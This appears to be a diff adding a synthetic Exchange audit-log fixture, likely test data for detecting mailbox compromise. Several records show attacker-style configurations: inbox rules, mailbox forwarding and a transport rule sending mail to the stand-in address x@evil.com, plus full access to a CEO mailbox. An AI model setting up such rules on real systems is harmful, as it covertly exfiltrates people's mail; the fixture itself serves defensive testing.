@@ -1,0 +1,151 @@
+[
+ {
+  "CreationTime": "NOW-30h",
+  "Id": "ex-1",
+  "Operation": "New-InboxRule",
+  "RecordType": 1,
+  "ResultStatus": "True",
+  "UserId": "alice@contoso.com",
+  "Workload": "Exchange",
+  "ClientIP": "198.51.100.7:51234",
+  "ObjectId": "",
+  "Parameters": [
+   {
+    "Name": "Mailbox",
+    "Value": "alice"
+   },
+   {
+    "Name": "Name",
+    "Value": "."
+   },
+   {
+    "Name": "ForwardTo",
+    "Value": "x@evil.com"
+   },
+   {
+    "Name": "MarkAsRead",
+    "Value": "True"
+   }
+  ]
+ },
+ {
+  "CreationTime": "NOW-30h",
+  "Id": "ex-2",
+  "Operation": "Set-Mailbox",
+  "RecordType": 1,
+  "ResultStatus": "True",
+  "UserId": "admin@contoso.com",
+  "Workload": "Exchange",
+  "ClientIP": "198.51.100.7:51234",
+  "ObjectId": "",
+  "Parameters": [
+   {
+    "Name": "Identity",
+    "Value": "bob"
+   },
+   {
+    "Name": "ForwardingSmtpAddress",
+    "Value": "smtp:x@evil.com"
+   },
+   {
+    "Name": "DeliverToMailboxAndForward",
+    "Value": "True"
+   }
+  ]
+ },
+ {
+  "CreationTime": "NOW-30h",
+  "Id": "ex-3",
+  "Operation": "Add-MailboxPermission",
+  "RecordType": 1,
+  "ResultStatus": "True",
+  "UserId": "admin@contoso.com",
+  "Workload": "Exchange",
+  "ClientIP": "198.51.100.7:51234",
+  "ObjectId": "",
+  "Parameters": [
+   {
+    "Name": "Identity",
+    "Value": "ceo"
+   },
+   {
+    "Name": "User",
+    "Value": "mallory"
+   },
+   {
+    "Name": "AccessRights",
+    "Value": "FullAccess"
+   }
+  ]
+ },
+ {
+  "CreationTime": "NOW-30h",
+  "Id": "ex-4",
+  "Operation": "New-TransportRule",
+  "RecordType": 1,
+  "ResultStatus": "True",
+  "UserId": "admin@contoso.com",
+  "Workload": "Exchange",
+  "ClientIP": "198.51.100.7:51234",
+  "ObjectId": "",
+  "Parameters": [
+   {
+    "Name": "Name",
+    "Value": "Copy"
+   },
+   {
+    "Name": "BlindCopyTo",
+    "Value": "x@evil.com"
+   }
+  ]
+ },
+ {
+  "CreationTime": "NOW-30h",
+  "Id": "ex-5",
+  "Operation": "UpdateInboxRules",
+  "RecordType": 1,
+  "ResultStatus": "True",
+  "UserId": "carol@contoso.com",
+  "Workload": "Exchange",
+  "ClientIP": "198.51.100.7:51234",
+  "ObjectId": "",
+  "OperationProperties": [
+   {
+    "Name": "RuleName",
+    "Value": "x"
+   },
+   {
+    "Name": "RuleActions",
+    "Value": "[{\"ActionType\":\"Forward\",\"Recipients\":[\"x@evil.com\"]}]"
+   }
+  ]
+ },
+ {
+  "CreationTime": "NOW-30h",
+  "Id": "ex-6",
+  "Operation": "MailItemsAccessed",
+  "UserId": "dave@contoso.com",
+  "Workload": "Exchange"
+ },
+ {
+  "CreationTime": "NOW-30h",
+  "Id": "ex-7",
+  "Operation": "Set-InboxRule",
+  "RecordType": 1,
+  "ResultStatus": "True",
+  "UserId": "erin@contoso.com",
+  "Workload": "Exchange",
+  "ClientIP": "198.51.100.7:51234",
+  "ObjectId": "",
+  "Parameters": [
+   {
+    "Name": "Identity",
+    "Value": "r"
+   },
+   {
+    "Name": "ForwardTo",
+    "Value": ""
+   }
+  ]
+ }
+]
